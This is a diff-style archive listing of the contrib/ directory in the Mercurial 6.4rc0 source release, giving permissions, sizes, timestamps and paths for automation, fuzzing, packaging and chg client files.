+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/automation/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9805 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/README.rst
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1724 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/automation.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/automation/hgautomation/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1508 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    41049 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/aws.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14557 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/cli.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18087 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/linux.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      551 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/pypi.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2144 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/ssh.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2474 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/try_server.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17472 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/windows.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2081 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/hgautomation/winrm.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13276 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/linux-requirements-py3.5.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21872 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/linux-requirements-py3.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      622 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/linux-requirements.txt.in
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15975 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/requirements.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       28 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/automation/requirements.txt.in
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1711 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/base-revsets.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15235 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/bash_completion
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2142 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/bdiff-torture.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/benchmarks/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3952 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/benchmarks/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      614 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/benchmarks/perf.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1599 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/benchmarks/revset.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    11670 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/byteify-strings.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      895 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/casesmash.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3627 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/catapipe.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    35048 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/check-code.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3217 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/check-commit
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5613 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/check-config.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3259 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/check-py3-compat.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     6143 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/check-pytype.sh
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/chg/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      895 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/Makefile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1223 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/README
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1231 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/chg.1
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14890 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/chg.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15997 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/hgclient.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      866 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/hgclient.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5881 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/procutil.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      528 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/procutil.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/util.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      855 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/chg/util.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      367 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/clang-format-ignorelist
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1179 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/debugcmdserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1452 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/debugshell.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.182632 mercurial-6.4rc0/contrib/docker/
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/docker/apache-server/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      520 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/docker/apache-server/Dockerfile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5211 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/docker/apache-server/README.rst
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2154 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/docker/apache-server/entrypoint.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       67 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/docker/apache-server/hgwebconfig
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      713 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/docker/apache-server/vhost.conf
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1351 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/dumprevlog
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1420 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/editmerge
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      102 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/editmergeps.bat
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1616 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/editmergeps.ps1
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/examples/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      496 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/examples/fix.hgrc
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/fuzz/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12668 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/FuzzedDataProvider.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4947 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/Makefile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      894 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/README.rst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      969 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/bdiff.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1220 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/dirs.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      661 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/dirs_corpus.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1062 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/dirstate.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      479 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/dirstate_corpus.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1394 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/fm1readmarkers.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1958 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/fm1readmarkers_corpus.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1851 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/fncache.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1002 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/fuzzutil.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1398 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/jsonescapeu8fast.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2075 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/manifest.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1383 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/manifest_corpus.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3078 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/mpatch.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23524 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/mpatch_corpus.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1752 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/pyutil.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      228 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/pyutil.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1659 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/revlog.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      812 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/revlog_corpus.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1515 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/standalone_fuzz_target_runner.cc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1422 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/fuzz/xdiff.cc
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4284 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/genosxversion.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4471 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/heptapod-ci.yml
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3541 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hg-ssh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3652 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hg-test-mode.el
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4020 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgclient.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)   113188 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgk
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2903 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgperf
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/hgsh/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      160 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgsh/Makefile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8745 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgsh/hgsh.c
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      669 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgweb.fcgi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      678 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/hgweb.wsgi
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)    27296 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/import-checker.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10848 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/install-windows-dependencies.ps1
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8847 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/logo-droplets.svg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1006 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/memory.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    44271 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/mercurial.el
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/merge-lists/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14485 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/merge-lists/Cargo.lock
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      599 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/merge-lists/Cargo.toml
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/merge-lists/src/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10241 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/merge-lists/src/main.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/merge-lists/tests/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3310 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/merge-lists/tests/test-merge-lists.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12462 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/mq.el
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/packaging/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4059 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/Makefile
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1123 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/build-linux-wheels.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2667 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/builddeb
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4530 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/buildrpm
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.190632 mercurial-6.4rc0/contrib/packaging/debian/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      161 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/cacerts.rc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      164 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/changelog
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        2 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/compat
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1224 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/control
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1072 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/copyright
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       62 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/default-tools.rc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       38 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/hgkpath.rc
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     4475 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/debian/rules
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/packaging/docker/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      298 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/docker/debian.template
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      275 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/docker/fedora.template
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      361 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/docker/rhel7
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      438 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/docker/rhel8
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      572 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/docker/rhel9
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      365 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/docker/ubuntu.template
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1462 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/dockerdeb
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1411 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/dockerrpm
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3501 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hg-docker
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/packaging/hgpackaging/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4074 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/cli.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3728 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/downloads.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4168 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/inno.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5183 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/pyoxidizer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5918 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/util.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2688 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/hgpackaging/wix.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/packaging/inno/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2424 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/inno/mercurial.iss
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5329 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/inno/modpath.iss
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1541 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/inno/readme.rst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       59 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/linux-wheel-centos5-blacklist
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/packaging/macosx/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1857 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/macosx/Readme.html
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      794 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/macosx/Welcome.html
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      805 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/macosx/distribution.xml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4843 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/mercurial.spec
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1312 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/packagelib.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1720 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/packaging.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2065 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/requirements-macos.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      545 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/requirements-macos.txt.in
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24492 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/requirements-windows-py3.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      507 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/requirements-windows.txt.in
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5151 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/requirements.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      122 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/requirements.txt.in
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/packaging/wix/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1792 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/wix/COPYING.rtf
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      135 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/wix/defines.wxi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      538 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/wix/guids.wxi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5648 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/wix/mercurial.wxs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1949 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/packaging/wix/readme.rst
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/perf-utils/
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5919 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/perf-utils/compare-discovery-case
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2659 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/perf-utils/discovery-helper.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3258 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/perf-utils/perf-revlog-write-plot.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5321 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/perf-utils/search-discovery-case
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6001 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/perf-utils/subsetmaker.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   124903 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/perf.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2439 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/phab-clean.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1315 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/phab-refresh-stack.sh
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/plan9/
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1050 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/9diff
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      277 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/9mail
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1761 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/README
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/plan9/hgrc.d/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      192 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/hgrc.d/9diff.rc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       97 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/hgrc.d/9mail.rc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      128 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/hgrc.d/factotum.rc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      742 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/mkfile
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      478 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/plan9/proto
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4269 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/pull_logger.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9205 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/pylintrc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      594 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-hook-examples.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/python-zstandard/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/LICENSE
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      139 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/MANIFEST.in
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    35617 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/NEWS.rst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    62506 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/README.rst
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.194632 mercurial-6.4rc0/contrib/python-zstandard/c-ext/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23805 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/bufferutil.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11571 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionchunker.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11668 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressiondict.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17529 2023-03-02 22:29:51.000000 mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionparams.c
